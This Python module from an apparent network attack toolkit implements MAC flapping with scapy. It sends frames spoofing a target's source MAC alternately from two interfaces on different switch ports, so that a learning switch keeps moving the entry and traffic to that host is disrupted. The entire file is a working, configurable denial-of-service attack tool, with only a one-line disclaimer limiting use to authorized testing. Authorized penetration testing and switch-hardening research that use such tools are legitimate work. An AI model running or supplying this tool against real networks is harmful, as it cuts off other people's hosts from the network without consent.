"""MAC flapping: moves one MAC address between switch ports, back and forth.

The attacker has two interfaces attached to two different switch ports. It
sends frames that use the same source MAC address (the target) alternately from
each interface. A learning switch then keeps moving the target's entry from one
port to the other, which disrupts the traffic destined to that MAC.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import re
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import random_mac

PAYLOAD_SIZE = 46
EXPERIMENTAL_ETHERTYPE = 0x88B5
_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")


@dataclass(frozen=True)
class MacFlappingConfig:
    iface_a: str              # attached to switch port A
    iface_b: str              # attached to switch port B
    target_mac: str = ""      # MAC to flap; empty = random
    count: int = 0            # frames to send; 0 = run until stopped
    interval: float = 0.0     # seconds between frames
    dry_run: bool = False     # build frames but do not send them

    def __post_init__(self) -> None:
        if self.iface_a == self.iface_b:
            raise ValueError("The two interfaces must be different ports.")
        if self.target_mac and not _MAC_RE.match(self.target_mac.lower()):
            raise ValueError(f"Invalid MAC address: {self.target_mac}")


@dataclass
class FlappingStats:
    frames: int = 0


def build_flap_frame(source_mac: str, rng: random.Random) -> Packet:
    """Frame that claims `source_mac` as its source, with a random unicast destination."""
    return (
        Ether(src=source_mac, dst=random_mac(rng), type=EXPERIMENTAL_ETHERTYPE)
        / Raw(load=rng.randbytes(PAYLOAD_SIZE))
    )


def run_flapping(
    config: MacFlappingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[FlappingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> FlappingStats:
    """Alternate frames between the two interfaces until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp
    target = config.target_mac.lower() or random_mac(rng)
    stats = FlappingStats()
    interfaces = (config.iface_a, config.iface_b)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_flap_frame(target, rng)
        if not config.dry_run:
            send(frame, iface=interfaces[stats.frames % 2], verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
